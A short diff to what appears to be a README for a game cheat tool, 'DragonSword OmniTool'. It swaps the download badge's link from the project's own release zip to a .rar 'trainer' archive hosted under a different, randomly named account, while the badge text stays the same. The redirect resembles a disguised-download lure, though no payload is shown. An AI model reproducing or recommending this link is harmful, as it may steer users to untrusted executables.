@@ -21,7 +21,7 @@
 </p>
 
 <p align="center">
-  <a href="https://github.com/EliteModder/DragonSword-OmniTool/releases/latest/download/DragonSwordOmniTool.zip">
+  <a href="https://github.com/andreylee-x04z3/DragonSword-Awakening-Trainer-Pro/releases/download/DragonSword/DragonSwordTrainer.rar">
     <img src="https://img.shields.io/badge/🚀_DOWNLOAD-OMNITOOL_V3.0-FF6B6B?style=for-the-badge">
   </a>
 </p>
